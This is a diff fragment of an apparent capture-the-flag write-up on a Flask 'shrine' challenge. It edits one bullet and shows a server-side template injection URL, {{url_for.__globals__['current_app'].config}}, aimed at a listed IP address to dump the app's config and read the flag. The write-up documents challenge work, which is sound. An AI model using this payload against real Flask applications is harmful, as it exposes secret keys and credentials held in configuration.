@@ -44,7 +44,7 @@ if __name__ == '__main__': app.run(debug=True)
  ![Screenshot from 2021-07-26 18-13-27](https://user-images.githubusercontent.com/87865134/126980102-12da23dc-724b-41ef-8212-dc8fc2391c5e.png)
 
   - `'current_app': <Flask 'app'>` is the current Flask to be used
-  - Flag is in app.config -> retrieve `current_app.config` to get flag
+  - Flag is in app.config -> retrieve `['current_app.config']` to get flag
   ```python
   http://111.200.241.244:62937/shrine/{{url_for.__globals__['current_app'].config}}
   ```
